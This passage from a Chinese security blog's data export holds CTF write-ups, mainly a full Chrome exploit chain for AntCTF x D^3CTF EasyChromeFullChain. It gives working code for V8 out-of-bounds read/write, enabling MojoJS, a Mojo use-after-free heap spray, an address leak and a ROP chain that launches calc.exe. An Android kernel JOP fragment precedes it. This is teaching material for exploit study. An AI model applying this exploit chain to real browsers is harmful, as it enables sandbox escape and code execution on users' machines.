[SP+0x40+var_40],#0x50.text:FFFFFF80080DB434                 RET\n\n让其先跳入下面的代码\n.kernel:FFFFFF8008707744                 LDRB            W8, [X0,#0x311].kernel:FFFFFF8008707748                 MOV             X19, X0.kernel:FFFFFF800870774C                 ADD             X29, SP, #0x10.kernel:FFFFFF8008707750                 CBZ             W8, loc_FFFFFF8008707774.kernel:FFFFFF8008707754                 LDR             X8, [X19,#0x338].kernel:FFFFFF8008707758                 CBZ             X8, loc_FFFFFF8008707764.kernel:FFFFFF800870775C                 ADD             X0, X19, #0x318.kernel:FFFFFF8008707760                 BLR             X8\n在这段代码中，我们的目的是控制X19指向X0，因为X0是我们可控的，我们不用担心BLR X8返回执行后面，因为我们可以再调用一次BLR来将X30覆盖。我们控制X8，让其先跳入下面的代码\n.kernel:FFFFFF80080DB3F8                 LDR             X8, [X19,#0xC8].kernel:FFFFFF80080DB3FC                 MOV             X0, X22.kernel:FFFFFF80080DB400                 MOV             X1, X21.kernel:FFFFFF80080DB404                 MOV             X2, X20.kernel:FFFFFF80080DB408                 BLR             X8.kernel:FFFFFF80080DB40C                 LDR             X8, [X19,#0xD0].kernel:FFFFFF80080DB410                 MOV             X20, X0.kernel:FFFFFF80080DB414                 MOV             X0, X19.kernel:FFFFFF80080DB418                 BLR             X8.kernel:FFFFFF80080DB41C                 SXTW            X0, W20.kernel:FFFFFF80080DB420.kernel:FFFFFF80080DB420 loc_FFFFFF80080DB420                    ; CODE XREF: handle_128+118↑j.kernel:FFFFFF80080DB420                 LDP             X29, X30, [SP,#0x40+var_s0].kernel:FFFFFF80080DB424                 LDP             X20, X19, [SP,#0x40+var_10].kernel:FFFFFF80080DB428                 LDP             X22, X21, [SP,#0x40+var_20].kernel:FFFFFF80080DB42C                 LDP             X24, X23, [SP,#0x40+var_30].kernel:FFFFFF80080DB430                 LDR             X25, [SP+0x40+var_40],#0x50.kernel:FFFFFF80080DB434                 RET\n在这段代码中，由于X19可控，我们可以调用3个参数的任意函数了，自始至终，我们的栈没有发生过调整，由于漏洞发生的位置栈尾部是这样的\n...........................text:FFFFFF80080DB420 loc_FFFFFF80080DB420                    ; CODE XREF: handle_128+118↑j.text:FFFFFF80080DB420                 LDP             X29, X30, [SP,#0x40+var_s0].text:FFFFFF80080DB424                 LDP             X20, X19, [SP,#0x40+var_10].text:FFFFFF80080DB428                 LDP             X22, X21, [SP,#0x40+var_20].text:FFFFFF80080DB42C                 LDP             X24, X23, [SP,#0x40+var_30].text:FFFFFF80080DB430                 LDR             X25, [SP+0x40+var_40],#0x50.text:FFFFFF80080DB434                 RET\n栈尾部跟我们的gadgets一摸一样，这意味着我们的gadgets在执行到RET时可以直接返回到漏洞发生的函数的上层，栈平衡了。也就是我们能够执行任意的一个函数，控制3个参数，同时栈能够恢复，可以让程序继续保持正常的运行状态。这样我们就可以进行多次的任意函数调用。\n总结本文我们介绍了众多在Android AARCH64上所使用的保护机制以及特性，劫持程序流程变得越来越困难，在没有开启程序流保护的情况下，使用JOP去实现任意代码执行；当程序流保护机制开启时，可以转变思路，通过劫持一些数据结构体，利用程序中自带的link、unlink等操作去实现一个地址写或者读，本文还介绍了MTE保护机制的一种特殊情况下的爆破。\n参考AVSS 2024 Final Writeup填补盾牌的裂缝：堆分配器中的MTE\n","categories":["安全研究"],"tags":["android","aarch64","selinux"]},{"title":"沙箱逃逸分析 AntCTF x D^3CTF EasyChromeFullChain","url":"/2021/05/20/AntCTFxD3CTF-EasyChromeFullChain/","content":"文章首发于安全KER https://www.anquanke.com/post/id/237501\n0x00 前言最近开始着手研究Chrome沙箱逃逸，正好借着本题学习一下。FullChain的漏洞利用一般需要依靠两个漏洞，首先是通过RCE开启Mojo（一种Chrome用于子进程与父进程进行通信的机制），然后通过Mojo漏洞逃离出沙箱。\n0x01 前置知识Mojo简单来说，就是一种通信机制，它由两部分组成，首先是C&#x2F;C++层的具体实现部分，这部分的代码会被一起编译进chrome程序中，并且它将运行在chrome的browser进程中(即主进程，没有沙箱的限制)，第二部分就是对外导出的api接口了，在编译好mojom以后，会得到一系列js文件，这些js文件就是对外开放的api库了，我们可以引用它们，从而调用在browser进程中的C&#x2F;C++代码。Mojo不止有js的导出api库，还有java和C&#x2F;C++的导出api库在一般的CTF的RealWord题目中，这些mojo的js库一般会部署到远程的web根目录下，仅仅是为了方便，在真实的场景中，这些js一般不会出现，或者出现在一些我们无法预知的路径中，实际上，由于Chrome开源，因此这些库我们都可以直接编译得到一份，然后将其放置在我们远程的服务器上即可要使用mojo的导出api，一般我们需要在js中引用两个库，一个是mojo_bindings.js，提供了一些Mojo操作用的对象和函数，另一个库就是我们想要调用的模块对应的js文件。\n&lt;\\script type=&quot;text/javascript&quot; src=&quot;/mojo_bindings.js&quot;&gt;&lt;\\/script&gt;&lt;\\script type=&quot;text/javascript&quot; src=&quot;/third_party/blink/public/mojom/xxxxx/xxxxx.mojom.js&quot;&gt;&lt;\\/script&gt;\n然后，想在代码中使用，只需下列两句话初始化\nlet xxxxx_ptr = new blink.mojom.xxxxx();Mojo.bindInterface(blink.mojom.xxxxx.name,mojo.makeRequest(xxxxx_ptr).handle, &quot;process&quot;, true);\n初始化以后，我们就可以使用xxxxx_ptr.的方式来调用browser进程中的C&#x2F;C++函数了。这种方式有点类似于Java中的JNI技术，在语言层仅声明函数，具体实现在底层。不同之处在于mojo的底层代码运行在browser进程,一旦mojo的模块代码实现有漏洞，便可能控制browser进程的程序流，进而完成了沙箱逃逸。\n0x02 V8 RCE部分漏洞分析diff --git a/src/compiler/simplified-lowering.cc b/src/compiler/simplified-lowering.ccindex ef56d56e44..0d0091fcd8 100644--- a/src/compiler/simplified-lowering.cc+++ b/src/compiler/simplified-lowering.cc@@ -187,12 +187,12 @@ bool CanOverflowSigned32(const Operator* op, Type left, Type right,   // We assume the inputs are checked Signed32 (or known statically to be   // Signed32). Technically, the inputs could also be minus zero, which we treat   // as 0 for the purpose of this function.-  if (left.Maybe(Type::MinusZero())) &#123;-    left = Type::Union(left, type_cache-&gt;kSingletonZero, type_zone);-  &#125;-  if (right.Maybe(Type::MinusZero())) &#123;-    right = Type::Union(right, type_cache-&gt;kSingletonZero, type_zone);-  &#125;+  // if (left.Maybe(Type::MinusZero())) &#123;+  //   left = Type::Union(left, type_cache-&gt;kSingletonZero, type_zone);+  // &#125;+  // if (right.Maybe(Type::MinusZero())) &#123;+  //   right = Type::Union(right, type_cache-&gt;kSingletonZero, type_zone);+  // &#125;   left = Type::Intersect(left, Type::Signed32(), type_zone);   right = Type::Intersect(right, Type::Signed32(), type_zone);   if (left.IsNone() || right.IsNone()) return false;@@ -1671,18 +1671,18 @@ class RepresentationSelector &#123;         VisitBinop&lt;T&gt;(node, UseInfo::TruncatingWord32(),                       MachineRepresentation::kWord32);         if (lower&lt;T&gt;()) &#123;-          if (lowering-&gt;poisoning_level_ ==-                  PoisoningMitigationLevel::kDontPoison &amp;&amp;-              (index_type.IsNone() || length_type.IsNone() ||+          if ((index_type.IsNone() || length_type.IsNone() ||                (index_type.Min() &gt;= 0.0 &amp;&amp;                 index_type.Max() &lt; length_type.Min()))) &#123;             // The bounds check is redundant if we already know that             // the index is within the bounds of [0.0, length[.             // TODO(neis): Move this into TypedOptimization?             new_flags |= CheckBoundsFlag::kAbortOnOutOfBounds;+            DeferReplacement(node, node-&gt;InputAt(0));+          &#125; else &#123;+            NodeProperties::ChangeOp(+               node, simplified()-&gt;CheckedUint32Bounds(feedback, new_flags));           &#125;-          NodeProperties::ChangeOp(-              node, simplified()-&gt;CheckedUint32Bounds(feedback, new_flags));         &#125;       &#125; else if (p.flags() &amp; CheckBoundsFlag::kConvertStringAndMinusZero) &#123;         VisitBinop&lt;T&gt;(node, UseInfo::CheckedTaggedAsArrayIndex(feedback),\n该patch位于CanOverflowSigned32函数，首先确定该函数的调用者，该函数首先在VisitSpeculativeIntegerAdditiveOp中被调用，然后在simplified-lowering阶段执行VisitNode时，遇到kSpeculativeSafeIntegerAdd或者kSpeculativeSafeIntegerSubtract时被调用来处理节点。\ncase IrOpcode::kSpeculativeSafeIntegerAdd:case IrOpcode::kSpeculativeSafeIntegerSubtract:  return VisitSpeculativeIntegerAdditiveOp&lt;T&gt;(node, truncation, lowering);\nif (lower&lt;T&gt;()) &#123;  if (truncation.IsUsedAsWord32() ||      !CanOverflowSigned32(node-&gt;op(), left_feedback_type,                           right_feedback_type, type_cache_,                           graph_zone())) &#123;    ChangeToPureOp(node, Int32Op(node));  &#125; else &#123;    ChangeToInt32OverflowOp(node);  &#125;&#125;\n为了研究CanOverflowSigned32的流程，我们使用如下代码进行测试\nfunction opt(b) &#123;  var x = b ? 0 : 1;  var y = b ? 2 : 3;  var i = x + y;  return i;&#125;for (var i=0;i&lt;0x10000;i++) &#123;   opt(true);   opt(false);&#125;\n在V8.TFBytecodeGraphBuilder阶段，就已经使用了SpeculativeSafeIntegerAdd函数来进行加法运算，到了V8.TFSimplifiedLowering阶段，SpeculativeSafeIntegerAdd被替换成了Int32Add，然而断点CanOverflowSigned32的话，发现未断下，说明该函数未被调用，显然是满足了条件truncation.IsUsedAsWord32，于是我们修改一下测试用例\nfunction opt(b) &#123;  var x = b ? 1 : -1;  var y = b ? 2 : -0x80000000;  var i = x + y;  return i;&#125;for (var i=0;i&lt;0x10000;i++) &#123;   opt(true);   //opt(false);&#125;\n首先，我们修改了变量x和y的范围，使得x为Range(-1,1)，y为Range(-0x80000000,2)，那么，对于这种情况，JIT目前还不知道是否可以使用int32的函数来计算，因为它只知道一个Range，如果是计算表达式-0x80000000+1的话，不会溢出，但如果是计算表达式-1+-0x80000000就会int32的范围，发生溢出。因此这种情况下，将会调用CanOverflowSigned32来检查。如果我们不注释掉opt(false);，结果如下这是因为JIT代码生成时收集的信息已经完整，直接使用int64的函数了。也不会去调用CanOverflowSigned32函数。现在知道如何触发CanOverflowSigned32函数以后，我们就可以在该函数下断点，然后进行调试\nIn file: /home/sea/Desktop/v8/src/compiler/simplified-lowering.cc   185 bool CanOverflowSigned32(const Operator* op, Type left, Type right,   186                          TypeCache const* type_cache, Zone* type_zone) &#123;   187   // We assume the inputs are checked Signed32 (or known statically to be   188   // Signed32). Technically, the inputs could also be minus zero, which we treat   189   // as 0 for the purpose of this function. ► 190   if (left.Maybe(Type::MinusZero())) &#123;   191     left = Type::Union(left, type_cache-&gt;kSingletonZero, type_zone);   192   &#125;   193   if (right.Maybe(Type::MinusZero())) &#123;   194     right = Type::Union(right, type_cache-&gt;kSingletonZero, type_zone);   195   &#125;pwndbg&gt; p left.Min()$2 = -1pwndbg&gt; p left.Max()$3 = 1pwndbg&gt; p right.Min()$4 = -2147483648pwndbg&gt; p right.Max()$5 = 2\n可以知道，这里，left就是x，而right就是y，被patch的这段代码\n190   if (left.Maybe(Type::MinusZero())) &#123;191     left = Type::Union(left, type_cache-&gt;kSingletonZero, type_zone);192   &#125;193   if (right.Maybe(Type::MinusZero())) &#123;194     right = Type::Union(right, type_cache-&gt;kSingletonZero, type_zone);195   &#125;\n其作用是通过与0进行Union，那么，如果left或者right中存在-0的话，会先转换为0。那么我们来继续分析一下，如果-0不被转换，会存在什么情况？首先，我们修改一下测试用例，添加一个-0\nfunction opt(b) &#123;  var x = b ? -1 : -0;  var y = b ? 2 : -0x80000000;  var i = x + y;  return i;&#125;for (var i=0;i&lt;0x10000;i++) &#123;   opt(true);&#125;\n主要是下面这里做Intersect时，将出现问题，因为-0不属于Type::Signed32()类型\n  196   left = Type::Intersect(left, Type::Signed32(), type_zone);  197   right = Type::Intersect(right, Type::Signed32(), type_zone);► 198   if (left.IsNone() || right.IsNone()) return false;\n正常情况下，结果是这样的\n   193   if (right.Maybe(Type::MinusZero())) &#123;   194     right = Type::Union(right, type_cache-&gt;kSingletonZero, type_zone);   195   &#125;   196   left = Type::Intersect(left, Type::Signed32(), type_zone);   197   right = Type::Intersect(right, Type::Signed32(), type_zone); ► 198   if (left.IsNone() || right.IsNone()) return false;   199   switch (op-&gt;opcode()) &#123;   200     case IrOpcode::kSpeculativeSafeIntegerAdd:   201       return (left.Max() + right.Max() &gt; kMaxInt) ||   202              (left.Min() + right.Min() &lt; kMinInt);   203 pwndbg&gt; p left.Min()$9 = -1pwndbg&gt; p left.Max()$10 = 0\npatch以后结果是这样的\npwndbg&gt; p left.Min()$1 = -1pwndbg&gt; p left.Max()$3 = -1\n即-0丢失了,x由Range(-1,-0)变成了Range(-1,-1)，显然，这将导致溢出检测出现问题，我们直接继续修改测试用例，将加法改成减法,那么Range(-1,-1)-Range(-0x80000000,2)显然没有超过int32，于是CanOverflowSigned32返回false，没有检查出溢出。\nfunction opt(b) &#123;  var x = b ? -1 : -0;  var y = b ? 2 : -0x80000000;  var i = x - y;  return i;&#125;for (var i=0;i&lt;0x10000;i++) &#123;   opt(true);&#125;print(opt(false));\n虽然输出的值仍然是2147483648，但实际上，cpu溢出标志位已经被设置，因此如果我们使用==与-0x80000000，将返回true，正常情况下是false。于是构造POC如下\nfunction opt(b) &#123;  var x = b ? -1 : -0;  var y = b ? 2 : -0x80000000;  var i = x - y;  return i == -0x80000000;&#125;for (var i=0;i&lt;0x10000;i++) &#123;   opt(true);&#125;print(opt(false));\nOOB数组构造我们注意到，还有一处patch\n-          if (lowering-&gt;poisoning_level_ ==-                  PoisoningMitigationLevel::kDontPoison &amp;&amp;-              (index_type.IsNone() || length_type.IsNone() ||+          if ((index_type.IsNone() || length_type.IsNone() ||                (index_type.Min() &gt;= 0.0 &amp;&amp;                 index_type.Max() &lt; length_type.Min()))) &#123;             // The bounds check is redundant if we already know that             // the index is within the bounds of [0.0, length[.             // TODO(neis): Move this into TypedOptimization?             new_flags |= CheckBoundsFlag::kAbortOnOutOfBounds;+            DeferReplacement(node, node-&gt;InputAt(0));\n此处patch的作用是在一些情况下将checkbounds节点消除，由于高版本V8已经不会将checkbounds节点直接消除，因此出题者为了降低难度增加了这个patch。构造OOB的数组过程如下，其过程比较简单\nvar length_as_double = p64f(0x08042a89,0x200000);function opt(b) &#123;  //Range(-1,-0)  var x = b ? -1 : -0;  //Range(-1,-0x80000000)  var y = b ? 1 : -0x80000000;  //Range(-1,0)  var i = ((x - y) == -0x80000000);  if (b) i = -1;  //将i转换为数字，否则会进行Deoptimization  //Range(-1,0)  //reality:1  i = i &gt;&gt; 0;  //Range(0,1)  //reality:2  i = i + 1;  //Range(0,2)  //reality:4  i = i * 2;  //Range(1,3)  //reality:5  i = i + 1  var arr = [1.1,2.2,3.3,4.4,5.5];  var oob = [1.1,2.2];  arr[i] = length_as_double;  return oob;&#125;for(let i = 0; i &lt; 0x20000; i++)  opt(true);var oob = opt(false);oob.length = 0x1000;\n查看一下IR图，在V8.TFEscapeAnalysis阶段时，还存在CheckBound节点然而到了V8.TFSimplifiedLowering阶段，该节点消除了，于是数组可以越界构造出OOB数组以后，只需接下来布局几个对象，即可轻松实现addressOf，read64，write64等原语，实现任意地址读写。\nvar obj_arr = [&#123;&#125;];var float_arr = new Float64Array(1.1,2.2);var arr_buf = new ArrayBuffer(0x1000);var adv = new DataView(arr_buf);var compression_high = u64f(oob[0x1d])[0];print(&quot;compression_high=&quot; + compression_high.toString(16));function addressOf(obj) &#123;   obj_arr[0] = obj;   var low = BigInt(u64f(oob[0x9])[1]) - 0x1n;   var addr = low | (BigInt(compression_high) &lt;&lt; 32n);   return addr;&#125;function read64(addr) &#123;   oob[0x22] = p64f(0,big2int(addr));   oob[0x23] = p64f(big2int(addr &gt;&gt; 32n),0);   return adv.getBigUint64(0,true);&#125;function write64(addr,value) &#123;   oob[0x22] = p64f(0,big2int(addr));   oob[0x23] = p64f(big2int(addr &gt;&gt; 32n),0);   adv.setBigUint64(0,value,true);&#125;\n地址泄露我们使用addressOf泄露出chrome.dll的地址，然后后续就可以计算出一些gadgets的地址\nvar window_addr = addressOf(window);chrome_dll_base = read64(window_addr+0x10n) - 0x7e86298n;console.log(&quot;chrome_dll_base=0x&quot; + chrome_dll_base.toString(16));\n\n0x03 沙箱逃逸Mojo部分漏洞分析+void RenderFrameHostImpl::CreateAntNest(+    mojo::PendingReceiver&lt;antctf::mojom::AntNest&gt; receiver) &#123;+  mojo::MakeSelfOwnedReceiver(std::make_unique&lt;AntNestImpl&gt;(this),+                                std::move(receiver));+&#125;\n在CreateAntNest创建实例时，使用std::make_unique&lt;AntNestImpl&gt;(this)，创建了一个AntNestImpl对象，并使用unique智能指针进行管理，那么意味着这个AntNestImpl对象的生命周期与通信管道绑定了，在js层，我们可以通过xxx.ptr.reset()来手动释放。this指针也就是RenderFrameHostImpl对象的指针被保存于AntNestImpl对象中\n+AntNestImpl::AntNestImpl(+        RenderFrameHost* render_frame_host)+        : render_frame_host_(render_frame_host)&#123;&#125;\n并且在AntNestImpl::Store和AntNestImpl::Fetch函数中，有调用render_frame_host_中的虚表函数\n+void AntNestImpl::Store(const std::string &amp;data)&#123;+    size_t depth = render_frame_host_-&gt;GetFrameDepth();+    if(depth == 0 || depth &gt; 10)&#123;+        return;+    &#125;+    size_t capacity = depth * 0x100;+    size_t count = capacity &lt; data.size() ? capacity : data.size();+    +    container_.emplace(+        std::make_pair(depth, data.substr(0, count))+    );+&#125;++void AntNestImpl::Fetch(FetchCallback callback)&#123;+    size_t depth = render_frame_host_-&gt;GetFrameDepth();+    if(depth == 0 || depth &gt; 10)&#123;+        std::move(callback).Run(&quot;error depth&quot;);+        return;+    &#125;+    auto it = container_.find(depth);+    if(it == container_.end())&#123;+        std::move(callback).Run(&quot;not yet stored&quot;);+        return;+    &#125;++    std::move(callback).Run(it-&gt;second);+&#125;\n然而该对象不会随着render_frame_host_对象的销毁而销毁，这意味着即使render_frame_host_被释放了,其指针仍然在AntNestImpl对象中，我们仍然可以对其相关函数进行调用，这就造成了UAF。\n开启Mojo功能正常情况下，chrome启动时是没有开启Mojo支持的，除非启动时加上选项--enable-blink-features=MojoJS，开启Mojo的判断逻辑如下\nvoid RenderFrameImpl::DidCreateScriptContext(v8::Local&lt;v8::Context&gt; context,                                             int world_id) &#123;  if (((enabled_bindings_ &amp; BINDINGS_POLICY_MOJO_WEB_UI) ||       enable_mojo_js_bindings_) &amp;&amp;      IsMainFrame() &amp;&amp; world_id == ISOLATED_WORLD_ID_GLOBAL) &#123;    // We only allow these bindings to be installed when creating the main    // world context of the main frame.    blink::WebContextFeatures::EnableMojoJS(context, true);  &#125;\n从中可以看出，只有main frame才可以支持Mojo，判断main frame是通过IsMainFrame函数来判断，实质就是frame对象中的一个字段，可以用任意地址读写将其修改为1，即可满足这一个条件，然而第二个条件就是enable_mojo_js_bindings_为真或者enabled_bindings_ 为BINDINGS_POLICY_MOJO_WEB_UI，即2，由于我们在V8方面已经可以任意地址读写，只需修改相关RenderFrameImpl对象中的一些字段，然后在js层使用window.location.reload();重新加载页面，即可开启Mojo。一个网页中可能会用多个RenderFrameImpl对象，我们可以使用如下方法在一个网页中添加一个iframe，其对应着RenderFrameImpl对象。\nvar iframe = document.createElement(&quot;iframe&quot;);iframe.src = &quot;child.html&quot;;document.body.appendChild(iframe);\n其中child.html内容如下\n&lt;\\html&gt;    &lt;\\script type=&quot;text/javascript&quot; src=&quot;/mojo_bindings.js&quot;&gt;&lt;\\/script&gt;    &lt;\\script src=&quot;/third_party/blink/public/mojom/ant_nest/ant_nest.mojom.js&quot;&gt;&lt;\\/script&gt;    &lt;\\script src=&quot;/enable_mojo.js&quot;&gt;&lt;\\/script&gt;    &lt;\\script&gt;        if (checkMojo())  &#123;           antNestPtr = new antctf.mojom.AntNestPtr();           Mojo.bindInterface(antctf.mojom.AntNest.name,                mojo.makeRequest(antNestPtr).handle, &quot;context&quot;, true);           antNestPtr.store(&quot;aaaabbbb&quot;);        &#125; else &#123;           enable_mojo();           window.location.reload();        &#125;    &lt;\\/script&gt;&lt;\\/html&gt;\n这些RenderFrameImpl对象，通过g_frame_map存储，这是一个全局变量，其定义如下\ntypedef std::map&lt;blink::WebFrame*, RenderFrameImpl*&gt; FrameMap;base::LazyInstance&lt;FrameMap&gt;::DestructorAtExit g_frame_map =    LAZY_INSTANCE_INITIALIZER;\n可以大致知道它是一个std::map容器，由于题目给我们的chrome.dll是去掉符号的，但幸运的是保留了一些调试信息，因此可以根据一些调试信息来定位g_frame_map的位置，不然就得重新编译一份版本一样的进行比对。可以通过IDA过滤字符串render_frame_impl.cc，然后定位到该字符串，交叉引用，列出一些函数，然后查看函数，找到一些特征，然后再加以动态调试观察可以确定7FF87C478E80这个位置就是g_frame_map，其偏移为0x8688e80，于是，我们可以遍历g_frame_map，修改每一个RenderFrameImpl对象里的信息，使其满足开启Mojo的条件\nfunction enable_mojo() &#123;   var g_frame_map_addr = chrome_dll_base + 0x8688e80n;   console.log(&quot;g_frame_map_addr=0x&quot; + g_frame_map_addr.toString(16));   var begin_ptr = read64(g_frame_map_addr + 0x8n);   while (begin_ptr != 0n) &#123;      var render_frame_ptr = read64(begin_ptr + 0x28n);      console.log(&quot;render_frame_ptr=0x&quot; + render_frame_ptr.toString(16));      var enabled_bindings_addr = render_frame_ptr + 0x5acn;      console.log(&quot;enabled_bindings_addr=0x&quot; + enabled_bindings_addr.toString(16));      write32(enabled_bindings_addr,2);      var is_main_frame_addr = render_frame_ptr + 0xc8n;      console.log(&quot;is_main_frame_addr=0x&quot; + is_main_frame_addr.toString(16));      write8(is_main_frame_addr,1);      begin_ptr = read64(begin_ptr + 0x8n);   &#125;   resetBacking_store();   return true;&#125;\n\n泄露RenderFrameImpl对象地址制造UAF比较简单，然后我们可以利用mojo自带的BlobRegistry对象进行heap spray将数据布局，伪造好render_frame_host_的虚表，利用BlobRegistry进行heap spray的方法已经被国外大佬封装为函数，几乎可以在Mojo这一类UAF中统一使用。\nfunction getAllocationConstructor() &#123;   let blob_registry_ptr = new blink.mojom.BlobRegistryPtr();   Mojo.bindInterface(blink.mojom.BlobRegistry.name,mojo.makeRequest(blob_registry_ptr).handle, &quot;process&quot;, true);   function Allocation(size=280) &#123;      function ProgressClient(allocate) &#123;         function ProgressClientImpl() &#123;         &#125;         ProgressClientImpl.prototype = &#123;            onProgress: async (arg0) =&gt; &#123;               if (this.allocate.writePromise) &#123;                  this.allocate.writePromise.resolve(arg0);               &#125;            &#125;         &#125;         this.allocate = allocate;         this.ptr = new mojo.AssociatedInterfacePtrInfo();         var progress_client_req = mojo.makeRequest(this.ptr);         this.binding = new mojo.AssociatedBinding(blink.mojom.ProgressClient, new ProgressClientImpl(), progress_client_req);         return this;      &#125;      this.pipe = Mojo.createDataPipe(&#123;elementNumBytes: size, capacityNumBytes: size&#125;);      this.progressClient = new ProgressClient(this);      blob_registry_ptr.registerFromStream(&quot;&quot;, &quot;&quot;, size, this.pipe.consumer, this.progressClient.ptr).then((res) =&gt; &#123;         this.serialized_blob = res.blob;      &#125;);      this.malloc = async function(data) &#123;         promise = new Promise((resolve, reject) =&gt; &#123;            this.writePromise = &#123;resolve: resolve, reject: reject&#125;;         &#125;);         this.pipe.producer.writeData(data);         this.pipe.producer.close();         written = await promise;         console.assert(written == data.byteLength);      &#125;      this.free = async function() &#123;         await this.serialized_blob.blob.ptr.reset();      &#125;      this.read = function(offset, length) &#123;         this.readpipe = Mojo.createDataPipe(&#123;elementNumBytes: 1, capacityNumBytes: length&#125;);         this.serialized_blob.blob.readRange(offset, length, this.readpipe.producer, null);         return new Promise((resolve) =&gt; &#123;            this.watcher = this.readpipe.consumer.watch(&#123;readable: true&#125;, (r) =&gt; &#123;               result = new ArrayBuffer(length);               this.readpipe.consumer.readData(result);               this.watcher.cancel();               resolve(result);            &#125;);         &#125;);      &#125;      this.readQword = async function(offset) &#123;         let res = await this.read(offset, 8);         return (new DataView(res)).getBigUint64(0, true);      &#125;      return this;   &#125;   async function allocate(data) &#123;      let allocation = new Allocation(data.byteLength);      await allocation.malloc(data);      return allocation;   &#125;   return allocate;&#125;\n为了泄露RenderFrameImpl对象地址，我们可以将GetFrameDepth函数伪造为某一类特殊函数，首先能够正常被调用且返回，其次可以往我们能够控制的地方写入一些对象地址。一个在CFG绕过中的思想就可以用到这里了，我们将GetFrameDepth函数指针伪造为RtlCaptureContext，\n0:000&gt; rrax=00007ff87c342190 rbx=000000006b00c513 rcx=0000022c35d045e0rdx=0000004b4c3fe140 rsi=0000022c365f2e30 rdi=0000004b4c3fe140rip=00007ff874e2c47b rsp=0000004b4c3fe070 rbp=0000000000000002 r8=0000000000000000  r9=0000000000000000 r10=0000000000008000r11=0000004b4c3fdfc0 r12=0000022c365677c0 r13=0000004b4c3fe7c0r14=0000022c365f2e30 r15=0000000000000000iopl=0         nv up ei pl nz na po nccs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206chrome!ovly_debug_event+0x1039e9b:00007ff8`74e2c47b ff90c8000000    call    qword ptr [rax+0C8h]\n注意到此时rcx指向的就是RenderFrameImpl对象地址，我们想要泄露的就是这个值，我们看一下RtlCaptureContext的代码\n.text:00000001800A0D10                 pushfq.text:00000001800A0D12                 mov     [rcx+78h], rax.text:00000001800A0D16                 mov     [rcx+80h], rcx.text:00000001800A0D1D                 mov     [rcx+88h], rdx.text:00000001800A0D24                 mov     [rcx+0B8h], r8.text:00000001800A0D2B                 mov     [rcx+0C0h], r9...........................\n一句mov     [rcx+80h], rcx将rcx的值保存到了RenderFrameImpl对象内部，然后我们使用BlobRegistry对象将该处的数据读取出来就可以得到地址了。官方WP的做法也是这个原理，只不过他使用的是content::WebContentsImpl::GetWakeLockContext这个函数。所以，我们可以将虚表指针伪造为IAT表地址，使得call    qword ptr [rax+0C8h]正好调用到RtlCaptureContext，然后我们将数据读出。\n//伪造RenderFrameHost对象 const fakeRFH = new BigUint64Array(RenderFrameHost_SIZE / 8).fill(0x4141414141414141n); //vtable fakeRFH[0] = RtlCaptureContext_iat - 0xc8n; //heap spray for (var i=0;i&lt;spray_count;i++) &#123;    spray_arr.push(await allocate(fakeRFH.buffer)); &#125; //call RtlCaptureContext await antNestPtr.store(&quot;&quot;) //now leak the address var rfh_addr = -1; //var allocation; for (var i=0;i&lt;spray_count;i++) &#123;    allocation = spray_arr[i];    var x = await allocation.readQword(0x80);    if (x != 0x4141414141414141n) &#123;       rfh_addr = x;       break;    &#125; &#125; if (rfh_addr == -1) &#123;    return false; &#125;\nROP现在，准备工作都做好了，那么就可以直接进行ROP了\n//释放blob，重新heap sprayawait allocation.free();console.log(&quot;rfh_addr=0x&quot; + rfh_addr.toString(16));//0x00000001814fbfae : xchg rax, rsp ; retvar xchg_rax_rsp = chrome_dll_base + 0x14fbfaen;//0x00000001850caadf : mov rax, qword ptr [rcx + 0x10] ; add rcx, 0x10 ; call qword ptr [rax + 0x158]var adjust_register = chrome_dll_base + 0x50caadfn;//0x0000000184ebc82f : add rsp, 0x158 ; retvar add_rsp_158 = chrome_dll_base + 0x4ebc82fn;var shellExecuteA = chrome_dll_base + 0x3FA9C0Fn;var pop_rsi = chrome_dll_base + 0x13b8n;fakeRFH.fill(0n);//fakefakeRFH[0] = rfh_addr;fakeRFH[0x10 / 0x8] = rfh_addr + 0x18n;fakeRFH[0x18 / 0x8] = add_rsp_158;fakeRFH[0xc8 / 0x8] = adjust_register;fakeRFH[0x170 / 0x8] = xchg_rax_rsp;//now ropfakeRFH[0x178 / 0x8] = pop_rsi;fakeRFH[0x180 / 0x8] = rfh_addr + 0x1c0n;fakeRFH[0x188 / 0x8] = shellExecuteA;fakeRFH[0x1b0 / 0x8] = 0n;fakeRFH[0x1b8 / 0x8] = 0x3n;//cmdvar cmd = &quot;calc.exe\\x00&quot;;var cmd_buf = new Uint8Array(fakeRFH.buffer);for (var i=0;i&lt;cmd.length;i++) &#123;   cmd_buf[0x1c0 + i] = cmd.charCodeAt(i);&#125;//heap sprayfor (var i=0;i&lt;spray_count;i++) &#123;   await allocate(fakeRFH.buffer);&#125;//runawait antNestPtr.store(&quot;&quot;);\n效果如下\n0x04 感想Chrome沙箱逃逸这一块做起来还是不错的，也没那么难。通过学习，收获了许多。\n0x05 参考chromium 之 ipc (mojo) 消息机制Mojo docs (go&#x2F;mojo-docs)SCTF2020-EasyMojo利用 Mojo IPC 的 UAF 漏洞逃逸 Chrome 浏览器沙箱90分钟加时依然无解 | AntCTF x D^3CTF [EasyChromeFullChain] Writeup\n","categories":["CTF","安全研究"],"tags":["JS引擎漏洞","Chrome沙箱逃逸","heap spray","UAF"]},{"title":"AntCTFxD3CTF_hackphp","url":"/2021/03/11/AntCTFxD3CTF-hackphp/","content":"文章首发于安全KER https://www.anquanke.com/post/id/233831\n0x00前言从一题学习php模块的编写，学习WEB PWN，并演示WEB PWN中的堆UAF利用基本手法。\n0x01 PHP模块的编写php模块一般使用C&#x2F;C++编写，编译后以库文件的形式进行加载，在Linux下为.so，Windows下为.dll。下面，我们来编写一个php模块的helloword，并在php里进行调用。首先下载php源码，进入php源码目录的ext目录,执行\nroot@ubuntu:/home/sea/Desktop/php-src/ext# ./ext_skel.php --ext hellowordCopying config scripts... doneCopying sources... doneCopying tests... doneSuccess. The extension is now ready to be compiled. To do so, use thefollowing steps:cd /path/to/php-src/hellowordphpize./configuremakeDon&#x27;t forget to run tests once the compilation is done:make testThank you for using PHP!\n模块基本语法该程序直接为我们生成了一个模板，我们可以直接查看源码\n/* helloword extension for PHP */#ifdef HAVE_CONFIG_H# include &quot;config.h&quot;#endif#include &quot;php.h&quot;#include &quot;ext/standard/info.h&quot;#include &quot;php_helloword.h&quot;/* For compatibility with older PHP versions */#ifndef ZEND_PARSE_PARAMETERS_NONE#define ZEND_PARSE_PARAMETERS_NONE() \\\tZEND_PARSE_PARAMETERS_START(0, 0) \\\tZEND_PARSE_PARAMETERS_END()#endif/* &#123;&#123;&#123; void helloword_test1() 